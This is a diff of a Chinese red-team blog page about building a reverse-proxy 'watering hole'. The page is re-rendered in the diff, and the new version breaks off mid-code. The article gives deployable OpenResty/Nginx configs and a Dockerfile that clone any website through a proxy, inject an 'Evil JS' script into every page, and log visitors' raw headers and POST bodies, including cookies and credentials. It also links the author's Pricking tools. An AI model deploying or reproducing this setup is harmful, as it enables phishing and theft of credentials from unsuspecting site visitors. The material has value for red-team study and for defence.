@@ -1,158 +1,329 @@
-<!doctype html><html lang><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>红队技巧：基于反向代理的水坑攻击 « 倾旋的博客</title><meta name=description content="倾旋的博客"><meta name=author content="倾旋"><link rel=stylesheet href=/css/Font-Awesome-5.15.3.all.min.css><link rel=stylesheet href=/sass/researcher.min.css><link rel=icon type=image/ico href=https://payloads.online/favicon.ico></head><body><input type=checkbox id=menu-toggle class=menu-toggle>
-<label tabindex=0 for=menu-toggle class=burger><span></span> <span></span> <span></span><div class=burger-text>Menu</div></label><nav class=main-nav><ul><li><a href=/projects/>Projects</a></li><li><a href=/links/>Links</a></li><li><a href=/post/>Posts</a></li><li><a href=/index.xml>Rss</a></li><li><a href=/tools/>Tools</a></li></ul></nav><nav><a href=/ class=all-posts-link>‹ All Posts</a></nav><div id=content><div class=container><h1>红队技巧：基于反向代理的水坑攻击</h1><p>在红队行动中，一般使用邮件钓鱼会携带诱饵附件，但常被邮件网关拦截，如果想要去收集更多的有效信息，可以在邮件中埋入水坑链接。而埋入的水坑的制作，对于红队来说又有些繁琐，因此本文记录一下我实现自动化三种解决方案。</p><div class=toc-wrapper><div class=post-toc id=post-toc><aside><nav id=TableOfContents><ul><li><a href=#0x00-前言>0x00 前言</a></li><li><a href=#0x01-实现目标>0x01 实现目标</a></li><li><a href=#0x02-nginx实现---快速部署与完美克隆>0x02 Nginx实现 - 快速部署与完美克隆</a><ul><li><a href=#openresty配置文件>OpenResty配置文件</a></li><li><a href=#openresty---lua-ngx-api>OpenResty - Lua Ngx API</a></li><li><a href=#lua-ngx-api---block>Lua Ngx API - Block</a></li><li><a href=#nginx-反向代理配置>Nginx 反向代理配置</a></li><li><a href=#注入模块化的evil-js>注入模块化的Evil JS</a></li><li><a href=#使用es6标准将js模块化>使用ES6+标准将JS模块化</a></li><li><a href=#nginx---记录日志或凭证>Nginx - 记录日志或凭证</a></li><li><a href=#nginx---最终配置>Nginx - 最终配置</a></li><li><a href=#nginx---dockerfile编写>Nginx - Dockerfile编写</a></li><li><a href=#nginx---docker-compose>Nginx - docker-compose</a></li></ul></li><li><a href=#0x03-golang实现---快速部署与完美克隆>0x03 Golang实现 - 快速部署与完美克隆</a><ul><li><a href=#修改响应内容>修改响应内容</a></li><li><a href=#pricking-使用>Pricking 使用</a></li></ul></li><li><a href=#0x04-nodejs实现---快速部署与完美克隆>0x04 NodeJS实现 - 快速部署与完美克隆</a><ul><li><a href=#pricking-node-使用>Pricking-node 使用</a></li><li><a href=#劫持flash下载>劫持Flash下载</a></li></ul></li><li><a href=#参考>参考</a></li></ul></nav></aside><a href=# id=toc-toggle></a></div></div><p>完整项目代码：</p><ul><li>Go语言版本：<a href=https://github.com/Rvn0xsy/Pricking>Pricking</a></li><li>NodeJS版本：<a href=https://github.com/Rvn0xsy/Pricking-node>Pricking-node</a></li></ul><h2 id=0x00-前言>0x00 前言</h2><p>在红队行动中，一般使用邮件钓鱼会携带诱饵附件，但常被邮件网关拦截，如果想要去收集更多的有效信息，可以在邮件中埋入水坑链接。而埋入的水坑的制作，对于红队来说又有些繁琐，因此本文记录一下我实现自动化这块的工作。</p><h2 id=0x01-实现目标>0x01 实现目标</h2><p>先明确一下实现目标：</p><ul><li>支持快速部署</li><li>完美克隆任意网站</li><li>可扩展的模块（受害者执行）</li><li>收集所有凭证（除了Cookie还有POST数据）</li></ul><h2 id=0x02-nginx实现---快速部署与完美克隆>0x02 Nginx实现 - 快速部署与完美克隆</h2><p>互联网上有许多网页克隆的工具，大多都是将网页的前端文件（html、js、图片等）下载到本地，这个方式即使自动化也很难与网站真实后端无缝对接。于是我采用Nginx的反向代理功能来实现完美克隆，让我的Web服务器充当一个真实的客户端。但Nginx本身默认情况下，没办法做到很灵活的逻辑操作，因此需要采用OpenResty内置的Lua脚本Block。</p><p><a href=http://openresty.org/cn/>OpenResty®</a> 是一个基于 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。</p><p>根据它的官方文档和<a href=https://github.com/openresty/docker-openresty>开源仓库</a>我找到了Docker环境，使用Docker镜像就能解决快速部署的问题了。</p><p>首先拉取镜像到本地，方便后续的操作：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker pull openresty/openresty:alpine
-</span></span></code></pre></div><h3 id=openresty配置文件>OpenResty配置文件</h3><p>OpenResty Docker环境共有两块需要关注的配置文件：</p><ul><li>/etc/nginx/conf.d</li><li><a href=https://github.com/openresty/docker-openresty/blob/master/nginx.conf>/usr/local/openresty/nginx/conf/nginx.conf</a></li></ul><p>其中主配置文件是最精简的，我根据OpenResty的文档优化了一个，后续Dockerfile的编写也是替换的主配置文件。</p><h3 id=openresty---lua-ngx-api>OpenResty - Lua Ngx API</h3><p>若想要在Nginx配置中执行Lua代码，需要遵循<a href=https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/>Lua Ngx API</a>，文档中提供了<code>*_by_lua</code>，<code>*_by_lua_block</code>和<code>*_by_lua_file</code>来引入Lua代码。</p><p><code>nginx.conf</code>简单实例：</p><pre tabindex=0><code>worker_processes  1;
-
-error_log  logs/error.log error;    # 日志级别
-
-events {
-    worker_connections  1024;
-}
-
-http {
-    server {
-        listen    80;
-        location / {
-            content_by_lua_block {
-                ngx.say(&#34;Hello,Rvn0xsy&#34;);
-            }
-        }
-    }
-}
-</code></pre><p>当OpenResty环境以<code>nginx.conf</code>作为配置文件启动的话，访问网站会输出<code>Hello,Rvn0xsy</code>。</p><h3 id=lua-ngx-api---block>Lua Ngx API - Block</h3><p>《OpenResty 最佳实践》中提供了一个流程图：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/b04661e2-4f5f-11ec-ad0b-00d861bf4abb.png alt=2021-02-16-16-48-59></p></p><p>根据这个流程图，可以将Lua代码放入不同的流程中对数据进行修改、删除、添加等。</p><p>如上面的<code>Hello,Rvn0xsy</code>例子，就是通过<code>content_by_lua_block</code>这个环节对响应内容进行修改。</p><p>本文用到的Block有：</p><ul><li>header_filter_by_lua_block 用于修改响应头</li><li>body_filter_by_lua_block 用于修改响应内容，注入JS</li><li>log_by_lua_block 用于记录请求日志或凭证</li></ul><h3 id=nginx-反向代理配置>Nginx 反向代理配置</h3><p><a href=https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/>Nginx反向代理</a>配置起来非常简单。</p><pre tabindex=0><code>location /some/path/ {
-    proxy_pass http://www.example.com/link/;
-}
-</code></pre><p><code>location</code>用于做URI匹配，当访问到<code>/some/path/</code>这个路径时，Nginx就代表客户端去访问<code>http://www.example.com/link/</code>，整个过程对客户端是完全透明的。</p><p>根据这个实例，可以直接写下第一部分，反向代理的配置了：</p><pre tabindex=0><code>location / {
-    proxy_pass http://www.example.com/link/;
-}
-</code></pre><p>访问根目录就等同于访问<code>http://www.example.com/link/</code>。</p><p>这里可能会产生一个问题，如果目标Web服务器对Host进行了判断，那么反向代理可能不会成功，因此需要将完美克隆的目标Host进行设置。</p><pre tabindex=0><code>worker_processes  1;
-
-error_log  logs/error.log error;    # 日志级别
-
-events {
-    worker_connections  1024;
-}
-
-http {
-    server {
-        listen    80;
-        server_name example-1.com;
-        location / {
-            proxy_pass http://www.example.com/link/;
-            proxt_set_header Host www.example.com;
-            proxt_set_header Referer http://www.example.com/link/;
-        }
-    }
-}
-</code></pre><p>至此，就能完美克隆目标网站了。</p><h3 id=注入模块化的evil-js>注入模块化的Evil JS</h3><p>使用<code>body_filter_by_lua_block</code>可以对网站内容进行修改，利用好这个功能，就能将JS文件引入到页面中。</p><pre tabindex=0><code>header_filter_by_lua_block { ngx.header.content_length = nil}
-                body_filter_by_lua_block{
-                        local chunk, eof = ngx.arg[1], ngx.arg[2]
-                        local buffered = ngx.ctx.buffered
-                        if not buffered then
-                           buffered = {}
-                           ngx.ctx.buffered = buffered
-                        end
-                        if chunk ~= &#34;&#34; then
-                           buffered[#buffered + 1] = chunk
-                           ngx.arg[1] = nil
-                        end
-                        if eof then
-                           local whole = table.concat(buffered)
-                           ngx.ctx.buffered = nil
-                           whole = whole .. &#34;&lt;script src=&#39;/7276df76835ed2272cc0e59f55e49902/static.js&#39; type=&#39;module&#39;&gt;&lt;/script&gt;&#34;
-                           ngx.arg[1] = whole
-                        end
-                }
-</code></pre><p>在修改网页内容之前，需要通过<code>header_filter_by_lua_block</code>将<code>Content-Length</code>进行清空，因为修改后，<code>Content-Length</code>的大小一定是改变的。</p><h3 id=使用es6标准将js模块化>使用ES6+标准将JS模块化</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;/7276df76835ed2272cc0e59f55e49902/static.js&#39;</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;module&#39;</span>&gt;&lt;/<span style=color:#f92672>script</span>&gt;
-</span></span></code></pre></div><p>其中<code>static.js</code>就是引入的Evil JS，添加了<code>type='module'</code>是为了启用<a href=https://www.freecodecamp.org/news/learn-modern-javascript/>ES6+</a>标准。</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/b087b05c-4f5f-11ec-8b14-00d861bf4abb.png alt=2021-02-16-17-10-54></p></p><p>为了不和源站的目录冲突，<code>7276df76835ed2272cc0e59f55e49902</code>其实是一个虚拟的目录，通过<code>location</code>映射即可。</p><pre tabindex=0><code>location ^~ /7276df76835ed2272cc0e59f55e49902/ {
-                alias    /tmp/pricking/static/;
-}
-</code></pre><p>关于Import的说明可以看<a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import>这篇文章</a>。</p><p>使用模块化功能可以让这个项目吸收更多关于浏览器丰富的操作，就像XSS平台那样。</p><h3 id=nginx---记录日志或凭证>Nginx - 记录日志或凭证</h3><p>由于<code>log_by_lua_block</code>是最后一个流程，可以把一些数据进行收集，写入日志文件。</p><pre tabindex=0><code>...
-
-http {
-    ....
-    log_format  logeverything  &#39;$current_time - $remote_addr \n$request_headers \n\n$request_body\n&#39;;
-  
-    server {
-            set $request_headers &#34;&#34;;
-            set $current_time &#34;&#34;;
-           ....
-
-            location / {
-                ...
-                log_by_lua_block {
-                    ngx.var.current_time = ngx.localtime()                  
-                    ngx.var.request_headers = ngx.req.raw_header()
-                }
-        }
-        access_log /tmp/pricking/access.log logeverything;
-    }
-}
-</code></pre><p><code>ngx.localtime()</code>和<code>ngx.req.raw_header()</code>是调用了<a href=https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/>Lua Ngx API</a>。</p><h3 id=nginx---最终配置>Nginx - 最终配置</h3><pre tabindex=0><code>worker_processes  1;
-events {
-    worker_connections  1024;
-}
-
-
-http {
-    include       mime.types;
-    default_type  application/octet-stream;
-    sendfile        on;
-    log_format  logeverything  &#39;$current_time - $remote_addr \n$request_headers \n\n$request_body\n&#39;;
-    
-
-    server {
-            set $request_headers &#34;&#34;;
-            set $current_time &#34;&#34;;
-
-            server_name proxy.payloads.online;
-            listen 80;
-
-            location ^~ /7276df76835ed2272cc0e59f55e49902/ {
-                alias    /tmp/pricking/static/;
-            }
-
-
-            location / {
-                proxy_pass http://payloads.online;
-                proxy_set_header Host payloads.online;
-                header_filter_by_lua_block { ngx.header.content_length = nil}
-                body_filter_by_lua_block{
-                        local chunk, eof = ngx.arg[1], ngx.arg[2]
-                        local buffered = ngx.ctx.buffered
-                        if not buffered then
-                           buffered = {}
-                           ngx.ctx.buffered = buffered
-                        end
-                        if chunk ~= &#34;&#34; then
-                           buffered[#buffered + 1] = chunk
-                           ngx.arg[1] = nil
-                        end
-                        if eof then
-                           local whole = table.concat(buffered)
-                           ngx.ctx.buffered = nil
-                           whole = whole .. &#34;&lt;script src=&#39;/7276df76835ed2272cc0e59f55e49902/static.js&#39; type=&#39;module&#39;&gt;&lt;/script&gt;&#34;
-                           ngx.arg[1] = whole
-                        end
-                }
-                log_by_lua_block {
-                    ngx.var.current_time = ngx.localtime()                  
-                    ngx.var.request_headers = ngx.req.raw_header()
-                }
-        }
-        access_log /tmp/pricking/access.log logeverything;
-    }
-}
-</code></pre><h3 id=nginx---dockerfile编写>Nginx - Dockerfile编写</h3><p>Dockerfile :</p><pre tabindex=0><code>FROM openresty/openresty:alpine
-ENV PROXY_PASS_HOST www.baidu-proxy.com # 自己的域名
-ENV PROXY_SOURCE_HOST www.baidu.com # 要克隆的域名
-ENV NGINX_LISTEN_PORT 80 # 监听端口，不建议改动
-ENV EVIL_JS_URI b026324c6904b2a9cb4b88d6d61c81d1 # JS虚拟目录名称
-WORKDIR /tmp/
-COPY nginx.conf /usr/local/openresty/nginx/conf/nginx.conf
-COPY docker-entrypoint.sh /tmp/docker-entrypoint.sh
-RUN mkdir -p /tmp/pricking/static/ &amp;&amp; chmod +x /tmp/docker-entrypoint.sh 
-ENTRYPOINT [&#34;/tmp/docker-entrypoint.sh&#34;]
-</code></pre><p>通过设置环境变量的值，就能完美克隆任意网站。</p><p>docker-entrypoint.sh :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/sh
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>红队技巧：基于反向代理的水坑攻击 - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1">
+<link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script></head><body><div class="container-wide wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=article-nav id=article-nav-id><div class=post><div class=post-header><div class=meta><div class=date><span class=day>16</span>
+<span class=rest>Feb 2021</span></div></div><div class=matter><h1 class=title>红队技巧：基于反向代理的水坑攻击</h1></div></div><aside class="show-on-mobile toc" id=static-toc><header><h3>Contents</h3></header><nav id=TableOfContents><ol><li><a href=#0x00-前言>0x00 前言</a></li><li><a href=#0x01-实现目标>0x01 实现目标</a></li><li><a href=#0x02-nginx实现---快速部署与完美克隆>0x02 Nginx实现 - 快速部署与完美克隆</a><ol><li><a href=#openresty配置文件>OpenResty配置文件</a></li><li><a href=#openresty---lua-ngx-api>OpenResty - Lua Ngx API</a></li><li><a href=#lua-ngx-api---block>Lua Ngx API - Block</a></li><li><a href=#nginx-反向代理配置>Nginx 反向代理配置</a></li><li><a href=#注入模块化的evil-js>注入模块化的Evil JS</a></li><li><a href=#使用es6标准将js模块化>使用ES6+标准将JS模块化</a></li><li><a href=#nginx---记录日志或凭证>Nginx - 记录日志或凭证</a></li><li><a href=#nginx---最终配置>Nginx - 最终配置</a></li><li><a href=#nginx---dockerfile编写>Nginx - Dockerfile编写</a></li><li><a href=#nginx---docker-compose>Nginx - docker-compose</a></li></ol></li><li><a href=#0x03-golang实现---快速部署与完美克隆>0x03 Golang实现 - 快速部署与完美克隆</a><ol><li><a href=#修改响应内容>修改响应内容</a></li><li><a href=#pricking-使用>Pricking 使用</a></li></ol></li><li><a href=#0x04-nodejs实现---快速部署与完美克隆>0x04 NodeJS实现 - 快速部署与完美克隆</a><ol><li><a href=#pricking-node-使用>Pricking-node 使用</a></li><li><a href=#劫持flash下载>劫持Flash下载</a></li></ol></li><li><a href=#参考>参考</a></li></ol></nav></aside><p>完整项目代码：</p><ul><li>Go语言版本：<a href=https://github.com/Rvn0xsy/Pricking>Pricking</a></li><li>NodeJS版本：<a href=https://github.com/Rvn0xsy/Pricking-node>Pricking-node</a></li></ul><h2 id=0x00-前言>0x00 前言</h2><p>在红队行动中，一般使用邮件钓鱼会携带诱饵附件，但常被邮件网关拦截，如果想要去收集更多的有效信息，可以在邮件中埋入水坑链接。而埋入的水坑的制作，对于红队来说又有些繁琐，因此本文记录一下我实现自动化这块的工作。</p><h2 id=0x01-实现目标>0x01 实现目标</h2><p>先明确一下实现目标：</p><ul><li>支持快速部署</li><li>完美克隆任意网站</li><li>可扩展的模块（受害者执行）</li><li>收集所有凭证（除了Cookie还有POST数据）</li></ul><h2 id=0x02-nginx实现---快速部署与完美克隆>0x02 Nginx实现 - 快速部署与完美克隆</h2><p>互联网上有许多网页克隆的工具，大多都是将网页的前端文件（html、js、图片等）下载到本地，这个方式即使自动化也很难与网站真实后端无缝对接。于是我采用Nginx的反向代理功能来实现完美克隆，让我的Web服务器充当一个真实的客户端。但Nginx本身默认情况下，没办法做到很灵活的逻辑操作，因此需要采用OpenResty内置的Lua脚本Block。</p><p><a href=http://openresty.org/cn/>OpenResty®</a> 是一个基于 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。</p><p>根据它的官方文档和<a href=https://github.com/openresty/docker-openresty>开源仓库</a>我找到了Docker环境，使用Docker镜像就能解决快速部署的问题了。</p><p>首先拉取镜像到本地，方便后续的操作：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker pull openresty/openresty:alpine
+</span></span></code></pre></td></tr></table></div></div><h3 id=openresty配置文件>OpenResty配置文件</h3><p>OpenResty Docker环境共有两块需要关注的配置文件：</p><ul><li>/etc/nginx/conf.d</li><li><a href=https://github.com/openresty/docker-openresty/blob/master/nginx.conf>/usr/local/openresty/nginx/conf/nginx.conf</a></li></ul><p>其中主配置文件是最精简的，我根据OpenResty的文档优化了一个，后续Dockerfile的编写也是替换的主配置文件。</p><h3 id=openresty---lua-ngx-api>OpenResty - Lua Ngx API</h3><p>若想要在Nginx配置中执行Lua代码，需要遵循<a href=https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/>Lua Ngx API</a>，文档中提供了<code>*_by_lua</code>，<code>*_by_lua_block</code>和<code>*_by_lua_file</code>来引入Lua代码。</p><p><code>nginx.conf</code>简单实例：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>worker_processes  1;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>error_log  logs/error.log error;    # 日志级别
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>events {
+</span></span><span style=display:flex><span>    worker_connections  1024;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>http {
+</span></span><span style=display:flex><span>    server {
+</span></span><span style=display:flex><span>        listen    80;
+</span></span><span style=display:flex><span>        location / {
+</span></span><span style=display:flex><span>            content_by_lua_block {
+</span></span><span style=display:flex><span>                ngx.say(&#34;Hello,Rvn0xsy&#34;);
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></td></tr></table></div></div><p>当OpenResty环境以<code>nginx.conf</code>作为配置文件启动的话，访问网站会输出<code>Hello,Rvn0xsy</code>。</p><h3 id=lua-ngx-api---block>Lua Ngx API - Block</h3><p>《OpenResty 最佳实践》中提供了一个流程图：</p><p><img src=https://images.payloads.online/b04661e2-4f5f-11ec-ad0b-00d861bf4abb.png alt=2021-02-16-16-48-59></p><p>根据这个流程图，可以将Lua代码放入不同的流程中对数据进行修改、删除、添加等。</p><p>如上面的<code>Hello,Rvn0xsy</code>例子，就是通过<code>content_by_lua_block</code>这个环节对响应内容进行修改。</p><p>本文用到的Block有：</p><ul><li>header_filter_by_lua_block 用于修改响应头</li><li>body_filter_by_lua_block 用于修改响应内容，注入JS</li><li>log_by_lua_block 用于记录请求日志或凭证</li></ul><h3 id=nginx-反向代理配置>Nginx 反向代理配置</h3><p><a href=https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/>Nginx反向代理</a>配置起来非常简单。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>location /some/path/ {
+</span></span><span style=display:flex><span>    proxy_pass http://www.example.com/link/;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></td></tr></table></div></div><p><code>location</code>用于做URI匹配，当访问到<code>/some/path/</code>这个路径时，Nginx就代表客户端去访问<code>http://www.example.com/link/</code>，整个过程对客户端是完全透明的。</p><p>根据这个实例，可以直接写下第一部分，反向代理的配置了：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>location / {
+</span></span><span style=display:flex><span>    proxy_pass http://www.example.com/link/;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></td></tr></table></div></div><p>访问根目录就等同于访问<code>http://www.example.com/link/</code>。</p><p>这里可能会产生一个问题，如果目标Web服务器对Host进行了判断，那么反向代理可能不会成功，因此需要将完美克隆的目标Host进行设置。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
